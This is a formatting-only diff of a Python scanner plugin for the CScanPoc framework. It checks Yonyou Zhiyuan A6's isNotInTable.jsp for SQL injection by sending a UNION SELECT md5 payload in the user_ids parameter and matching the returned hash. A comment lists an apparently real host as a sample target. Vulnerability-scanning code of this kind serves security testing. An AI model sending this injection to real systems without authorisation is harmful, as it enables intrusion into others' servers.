@@ -3,6 +3,7 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
     vuln_id = 'Yonyou_0002'  # 平台漏洞编号，留空
     name = '用友致远A6协同系统 /isNotInTable.jsp SQL Injection'  # 漏洞名称
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     product = 'Yonyou(用友)'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = 'e3603204-15f3-4c77-aec4-ac6ba54af749'
     author = 'cscan'  # POC编写者
@@ -31,21 +33,22 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
 
-            #target:http://110.167.194.10:8081
-            #ref: http://wooyun.org/bugs/wooyun-2010-0110312  http://www.beebeeto.com/pdb/poc-2015-0133/
-            verify_url=('%s/yyoa/ext/trafaxserver/ExtnoManage/isNotInTable.jsp?user_ids='
-                        '(17) union all select md5(3.1415)#') % self.target
+            # target:http://110.167.194.10:8081
+            # ref: http://wooyun.org/bugs/wooyun-2010-0110312  http://www.beebeeto.com/pdb/poc-2015-0133/
+            verify_url = ('%s/yyoa/ext/trafaxserver/ExtnoManage/isNotInTable.jsp?user_ids='
+                          '(17) union all select md5(3.1415)#') % self.target
             req = requests.get(verify_url)
-            
+
             if req.status_code != 404 and '63e1f04640e83605c1d177544a5a0488' in req.content:
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                    target=self.target, name=self.vuln.name))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
